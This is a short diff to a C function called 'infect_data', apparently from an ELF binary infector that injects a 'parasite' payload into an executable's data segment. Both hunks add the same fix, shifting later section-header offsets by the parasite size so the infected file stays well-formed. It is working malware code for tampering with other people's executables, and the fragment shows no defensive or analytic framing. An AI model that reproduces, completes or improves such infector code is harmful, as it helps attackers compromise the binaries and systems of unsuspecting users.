@@ -592,6 +592,8 @@ uint64_t infect_data(char *elfname, char *parasite, size_t size) {
         for (int i = 0; i < ehdr->e_shnum; i++) {
             if (shdr[i].sh_addr + shdr[i].sh_size == vend) {
                 shdr[i].sh_size += size;
+            } else if (shdr[i].sh_offset >= origin_data_offset) {
+                shdr[i].sh_offset += size;
             }
         }
 
@@ -621,6 +623,8 @@ uint64_t infect_data(char *elfname, char *parasite, size_t size) {
         for (int i = 0; i < ehdr->e_shnum; i++) {
             if (shdr[i].sh_addr + shdr[i].sh_size == vend) {
                 shdr[i].sh_size += size;
+            } else if (shdr[i].sh_offset >= origin_data_offset) {
+                shdr[i].sh_offset += size;
             }
         }
 
